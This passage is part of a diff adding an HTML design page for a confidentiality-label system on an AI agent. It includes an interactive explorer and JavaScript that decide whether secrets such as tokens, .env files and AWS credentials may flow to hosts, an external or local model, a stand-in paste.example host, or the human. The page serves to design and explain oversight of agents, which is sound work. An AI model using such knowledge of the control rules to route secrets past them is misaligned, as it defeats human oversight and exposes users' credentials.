+    <li><div><b>Build the read-back.</b> The per-principal view and the rule sentences (§5.3).</div></li>
+    <li><div><b>Typed quarantined results (§6.4).</b> A <code>bool</code> or closed <code>enum</code> from the helper, so that <span class="lv a">any-model</span> and <span class="lv l">local-model</span> tasks rarely need rung 3.</div></li>
+    <li><div><b>Measure.</b> Track the ask rate and the masked-result rate in live drills. If either climbs, the design is failing on utility, not on security.</div></li>
+  </ol>
+</section>
+
+<!-- ============ PART 6: EXPLORER ============ -->
+<section>
+  <div class="part"><span class="eyebrow">Part 6 · try it</span><h2>Flow explorer</h2></div>
+  <p>Pick what a holder has read raw, then a sink. The verdict follows the rules above. The files are the examples from Figure 8.</p>
+  <figure>
+    <div class="frame">
+      <form class="ex" id="ex" onsubmit="event.preventDefault()">
+        <fieldset id="src">
+          <legend>Holder has read raw</legend>
+          <label><input type="checkbox" id="s-pgpass" value="pgpass" checked> <span>~/proj/deploy.token <small>no-model · db.internal:5432</small></span></label>
+          <label><input type="checkbox" id="s-env" value="env"> <span>~/ws/app/.env <small>no-model · api.stripe.com</small></span></label>
+          <label><input type="checkbox" id="s-aws" value="aws"> <span>~/.aws/credentials <small>no-model · *.amazonaws.com</small></span></label>
+          <label><input type="checkbox" id="s-notes" value="notes"> <span>~/research/notes.md <small>local-model · no bindings</small></span></label>
+          <label><input type="checkbox" id="s-nda" value="nda"> <span>~/contracts/nda.pdf <small>any-model · smtp.gmail.com</small></span></label>
+        </fieldset>
+        <fieldset id="snk">
+          <legend>Sends to</legend>
+          <label><input type="radio" name="sink" id="k-db" value="db.internal:5432" checked> <span>db.internal:5432 <small>host</small></span></label>
+          <label><input type="radio" name="sink" id="k-stripe" value="api.stripe.com"> <span>api.stripe.com <small>host</small></span></label>
+          <label><input type="radio" name="sink" id="k-s3" value="s3.amazonaws.com"> <span>s3.amazonaws.com <small>host</small></span></label>
+          <label><input type="radio" name="sink" id="k-gmail" value="smtp.gmail.com"> <span>smtp.gmail.com <small>host</small></span></label>
+          <label><input type="radio" name="sink" id="k-evil" value="paste.example"> <span>paste.example <small>host</small></span></label>
+          <label><input type="radio" name="sink" id="k-ext" value="@external"> <span>Main model (vendor) <small>model · external</small></span></label>
+          <label><input type="radio" name="sink" id="k-loc" value="@local"> <span>local:vllm-1 <small>model · declared local: true</small></span></label>
+          <label><input type="radio" name="sink" id="k-human" value="@human"> <span>The human's terminal <small>reply filter</small></span></label>
+        </fieldset>
+        <div class="verdict" id="out" aria-live="polite"></div>
+      </form>
+    </div>
+    <figcaption><b>Figure 17.</b> Simplified: it treats the whole selection as one holder and ignores reader <code>output:</code> rules and the integrity axis.</figcaption>
+  </figure>
+</section>
+
+<footer>
+  <span>Sources: <code>confidentiality.md</code> §1–§7 (status 2026-10-03), <code>confidentiality-plan-13-reader-set-labels.md</code> §4–§5 (status 2026-10-04), <code>policy-surface.md</code> §2, §8, <code>docs/usage.md</code> and <code>docs/getting-started.md</code>, <code>launcher/src/subcommand-help.ts</code> and <code>why.ts</code>, <code>dashboard/public/index.html</code>, all at origin/master c7270e88. Part 3's proposals, Part 5's recommendation and the illustrative screens are not built behaviour. Existing companion figures: <code>docs/design/confidentiality/figures/reader-set-labels.html</code> and <code>flow-confidentiality.html</code>.</span>
+</footer>
+</div>
+
+<script>
+(function(){
+  var LV = {"public":0,"any-model":1,"local-model":2,"no-model":3};
+  var CLS = {"public":"p","any-model":"a","local-model":"l","no-model":"n"};
+  var FILES = {
+    pgpass:{name:"deploy.token",level:"no-model",bind:["db.internal:5432"]},
+    env:{name:".env",level:"no-model",bind:["api.stripe.com"]},
+    aws:{name:"aws creds",level:"no-model",bind:["*.amazonaws.com"]},
+    notes:{name:"notes.md",level:"local-model",bind:[]},
+    nda:{name:"nda.pdf",level:"any-model",bind:["smtp.gmail.com"]}
+  };
+  function hostMatch(pat, host){
+    if(pat===host) return true;
+    if(pat.indexOf("*.")===0){ var suf=pat.slice(1); return host.length>suf.length && host.slice(-suf.length)===suf; }
+    return false;
+  }
+  function render(){
+    var held=[].slice.call(document.querySelectorAll('#src input:checked')).map(function(i){return FILES[i.value];});
+    var sinkEl=document.querySelector('#snk input:checked'); var sink=sinkEl?sinkEl.value:"@human";
+    var out=document.getElementById('out'); out.className='verdict';
+    var esc=function(s){return String(s).replace(/[&<>]/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;"}[c];});};
+    if(!held.length){
+      out.classList.add('raw');
+      out.innerHTML='<span class="v">Raw: nothing secret held</span><p>A holder that has read nothing protected keeps every sink.</p>';
+      return;
+    }
+    var top=held.reduce(function(a,f){return LV[f.level]>LV[a]?f.level:a;},"public");
+    var lbl='<span class="lbl">Label(h): level = <span class="lv '+CLS[top]+'">'+top+'</span> · bindings = '+
+      (function(){ var hosts=null; held.forEach(function(f){ hosts = hosts===null? f.bind.slice() : hosts.filter(function(b){return f.bind.indexOf(b)>=0;}); }); return hosts.length? '{'+hosts.map(esc).join(', ')+'}' : '∅ (intersection is empty)'; })()+'</span>';
+    var v,cls,why;
+    if(sink==="@human"){ cls='raw'; v='Raw'; why='The human owns their secrets. The reply filter shows originals at every level.'; }
+    else if(sink==="@external"){
+      if(top==="public"){cls='raw';v='Raw';why='Public data.';}
+      else if(top==="any-model"){cls='cond';v='Symbol, readable on request';why='Every model is a cleared reader of any-model data. It stays a symbol until a quarantined read, or a logged in-context read that raises the session watermark.';}
+      else {cls='deny';v='Hard deny: symbol only';
+        var blk=held.filter(function(f){return LV[f.level]>=2;}).map(function(f){return f.name+' ('+f.level+')';});
+        why='An external model is outside the level of '+esc(blk.join(', '))+'. No approval changes this; only a level change would.';}
+    }
+    else if(sink==="@local"){
+      if(top==="no-model"){cls='deny';v='Hard deny: symbol only';
+        why='No model may read '+esc(held.filter(function(f){return f.level==="no-model";}).map(function(f){return f.name;}).join(', '))+', a declared local one included.';}
+      else {cls='cond';v='Readable on request';why='A declared local: true model admits public, any-model and local-model data, through the helper or a local main model.';}
+    }
+    else {
+      if(top==="public"){cls='raw';v='Raw';why='Public data.';}
+      else {
+        var blockers=held.filter(function(f){return LV[f.level]>0 && !f.bind.some(function(b){return hostMatch(b,sink);});});
+        if(!blockers.length){cls='raw';v='Released at the bound destination';why='Every file this holder read is bound to '+esc(sink)+', so it is in the intersection.';}
+        else {cls='ask';v='Ask the human';
+          why=esc(sink)+' is not bound for '+esc(blockers.map(function(f){return f.name;}).join(', '))+'. The Inbox offers Deny, Allow once, Allow this session, or Always (which adds a binding: a relaxation only a human makes).';
+          if(held.length>1 && blockers.length<held.length) why+=' The other held files would allow it: this is the intersection at work (D1).';}
+      }
+    }
+    out.classList.add(cls);
+    out.innerHTML='<span class="v">'+v+'</span><p>'+why+'</p>'+lbl;
+  }
+  document.getElementById('ex').addEventListener('change',render);
+  render();
+})();
+</script>
+</body>
+</html>
